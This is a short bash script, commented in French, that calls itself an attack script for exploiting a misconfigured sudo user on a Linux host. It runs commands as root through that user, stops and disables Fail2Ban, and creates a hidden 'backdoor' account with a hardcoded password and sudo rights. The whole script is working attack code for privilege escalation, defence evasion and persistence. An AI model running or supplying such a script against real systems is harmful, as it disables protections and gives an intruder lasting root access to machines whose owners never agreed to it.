#!/bin/bash

# Script d'attaque : Exploitation de l'utilisateur vulnérable
echo "Exploitation de l'utilisateur vulnérable..."

# Variables
USER="vulnerableuser"
COMMAND="whoami" # Commande à exécuter en tant que root (changez selon le besoin)

# Utiliser sudo avec l'utilisateur vulnérable pour exécuter des commandes root
echo "Exécution de la commande '$COMMAND' avec sudo..."
sudo -u $USER sudo $COMMAND || { echo "Erreur : Exploitation échouée."; exit 1; }

# Exemple : Désactiver Fail2Ban
echo "Désactivation de Fail2Ban..."
sudo -u $USER sudo systemctl stop fail2ban
sudo -u $USER sudo systemctl disable fail2ban

# Exemple : Ajouter une porte dérobée
echo "Ajout d'une porte dérobée en ajoutant un utilisateur root malveillant..."
sudo -u $USER sudo useradd -m backdoor -s /bin/bash
sudo -u $USER sudo echo "backdoor:backdoorpass" | sudo chpasswd
sudo -u $USER sudo usermod -aG sudo backdoor

echo "Attaque terminée. Porte dérobée créée avec l'utilisateur 'backdoor'."
